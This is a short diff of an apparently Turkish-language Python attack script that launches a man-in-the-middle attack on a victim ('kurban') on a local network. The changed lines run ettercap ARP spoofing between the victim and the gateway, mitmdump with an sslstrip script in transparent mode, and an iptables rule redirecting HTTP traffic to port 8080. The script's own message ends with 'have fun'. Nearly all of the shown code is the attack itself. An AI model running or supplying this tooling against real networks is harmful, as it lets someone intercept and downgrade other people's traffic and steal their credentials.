@@ -23,8 +23,8 @@ ettercap_kurban_ip = "/"+kurban_ip+"//"
 
 print(Fore.GREEN+"Man in the middle saldırısı başlatılıyor.Durumu açılan terminallerden görebilirsiniz.")
 
-subprocess.call(["xterm", "-T", "ettercap", "-hold", "-fg", "red", "-e", "ettercap", "-Tq", "-M", "arp:remote", "-i", arayuz, "-S", ettercap_modem_ip, ettercap_kurban_ip])
-subprocess.call(["xterm", "-T", "mitmdump", "-hold", "-fg", "green", "-e", "mitmdump", "-s", "sslstrip.py", "-m", "transparent"])
-subprocess.call(["iptables", "-t", "nat", "-A", "PREROUTING", "-p", "tcp", "--destination-port", "80", "-j", "REDIRECT", "--to-ports", "8080"])
+subprocess.Popen(["xterm", "-T", "ettercap", "-hold", "-fg", "red", "-e", "ettercap", "-Tq", "-M", "arp:remote", "-i", arayuz, "-S", ettercap_modem_ip, ettercap_kurban_ip])
+subprocess.Popen(["xterm", "-T", "mitmdump", "-hold", "-fg", "green", "-e", "mitmdump", "-s", "sslstrip.py", "-m", "transparent"])
+subprocess.Popen(["iptables", "-t", "nat", "-A", "PREROUTING", "-p", "tcp", "--destination-port", "80", "-j", "REDIRECT", "--to-ports", "8080"])
 
 print(Fore.GREEN+"Man in the middle saldırısı şu anda aktif.Kapatmak için açılan terminalleri kapatın.İyi eğlenceler :)")
